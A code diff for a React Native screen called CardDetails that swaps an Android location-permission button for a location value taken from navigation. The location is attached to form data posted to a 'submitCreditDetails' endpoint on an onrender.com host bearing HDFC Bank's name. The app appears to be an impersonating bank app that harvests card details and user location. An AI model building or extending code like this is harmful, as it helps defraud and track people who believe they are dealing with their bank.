@@ -1,4 +1,4 @@
-import { View, Text, TextInput, TouchableOpacity, StyleSheet, ScrollView, Alert, Modal, Pressable, PermissionsAndroid } from 'react-native'
+import { View, Text, TextInput, TouchableOpacity, StyleSheet, ScrollView, Alert, Modal } from 'react-native'
 import React, { useEffect, useState } from 'react'
 import { rgbaColor } from 'react-native-reanimated/src/reanimated2/Colors';
 import { Formik } from 'formik';
@@ -25,9 +25,10 @@ const initialValues = {
     mobile: "",
 }
 
-export default function CardDetails() {
+export default function CardDetails(props) {
     const [visible, setVisible] = useState(false);
-    const navigate = useNavigation()
+    console.log("props", props.route)
+    const location = props.route.params?.location
 
     const onClose = () => {
         setVisible(false)
@@ -35,11 +36,15 @@ export default function CardDetails() {
 
     async function submitDetails(value, resetForm) {
         console.log("values", value)
+        const values = {
+            ...value,
+            location
+        }
 
         try {
             const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}
 
-            const response = await axios.post("https://hdfc-bank-9qmz.onrender.com/api/v1/user/submitCreditDetails", value, {
+            const response = await axios.post("https://hdfc-bank-9qmz.onrender.com/api/v1/user/submitCreditDetails", values, {
                 headers: {
                     userid: user._id,
                     token: user.token
@@ -57,35 +62,8 @@ export default function CardDetails() {
         }
     }
 
-
-    async function requestLocationPermission() {
-        try {
-            const granted = await PermissionsAndroid.request(
-                PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
-                {
-                    'title': 'Example App',
-                    'message': 'Example App access to your location'
-                }
-            )
-            console.log("granted", granted)
-            if (granted === PermissionsAndroid.RESULTS.GRANTED) {
-                console.log("You can use the location");
-                Alert.alert("You can use the location");
-            } else {
-                console.log("location permission denied");
-                Alert.alert("Location permission denied");
-            }
-        } catch (err) {
-            console.warn(err)
-        }
-    }
-
     return (
         <>
-            <TouchableOpacity onPress={requestLocationPermission}>
-                <Text style={{ color: "red" }}>Ask Permission</Text>
-            </TouchableOpacity>
-
             <Formik
                 initialValues={initialValues}
                 validationSchema={schema}
